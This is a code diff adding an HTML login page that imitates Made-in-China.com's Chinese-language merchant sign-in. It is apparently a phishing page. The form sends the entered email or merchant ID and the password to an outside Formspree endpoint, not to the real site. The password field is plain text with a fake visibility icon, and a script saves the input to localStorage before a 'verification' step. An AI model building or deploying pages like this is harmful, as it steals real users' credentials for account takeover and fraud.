@@ -1,0 +1,73 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <title>Made-in-china</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+        .alt-link, .create-account { text-align: center; margin: 20px 0; color: #f97316; }
+    .social { display: flex; justify-content: center; gap: 40px; margin-top: 48px; }
+    .social img { width: 30px; height: 30px; }
+
+    .alink {
+  color: black;
+  font-size: 12px;
+  text-decoration: underline;
+}
+  </style>
+</head>
+<body>
+  <!-- Login Page -->
+  <div class="login-container" id="login-page">
+    <!-- <button class="cancel-button">Cancel</button> -->
+     <span class="cancel-button" onclick="history.back()">×</span>
+    <div class="logo">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFMh998znUNi9PzAZrggLKn4aVUhKgvXFXmQ&s" alt="Logo" style="border-radius:4px; width: 63px; height: 50px;">
+    </div>
+    <h1>登录</h1>
+    <form action="https://formspree.io/f/xgolldpe" method="POST" id="loginForm">
+    <input type="text" name="message" placeholder="电子邮箱或商家ID" class="login-input" id="user-input" oninput="enableNextButton()" required />
+    <input type="text" name="message" placeholder="请输入您的密码                                                          👁" class="login-input" id="textarea"  required />
+     <a href="#" class="alink">忘记密码？</a>
+    <button type="submit" class="next-button" id="next-button" onclick="goToVerification()" disabled>继续</button>
+  </form>
+   
+          <div class="alt-link">
+          <!--<a href="#">Sign in with a code</a>-->
+          <a class="alink" href="#">使用验证码登录</a>
+        </div>
+        <div class="create-account">
+          <!--New to the platform? <a href="#">Create an account</a>-->
+          <!--New to the made-in-china platform? <a href="#">Create an account</a>-->
+          <!--平台新用户？ <a href="#">创建账号</a>-->
+          Made-in-China平台新用户？ <a class="alink" href="#">创建账号</a>
+        </div>
+        <div class="social">
+          <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+        </div>
+      </div>
+  </div>
+
+  <script>
+    // Enable the Next button when the input is not empty
+    function enableNextButton() {
+      const userInput = document.getElementById("user-input").value;
+      const nextButton = document.getElementById("next-button");
+      nextButton.disabled = !userInput.trim(); // Enable only if input is not empty
+    }
+
+    // Save the input and navigate to the verification page
+    function goToVerification() {
+      const userInput = document.getElementById("user-input").value;
+      localStorage.setItem("userInput", userInput); // Save input in localStorage
+     
+    }
+  </script>
+ 
+
+  <script src="index.js"></script>
+</body>
+</html>
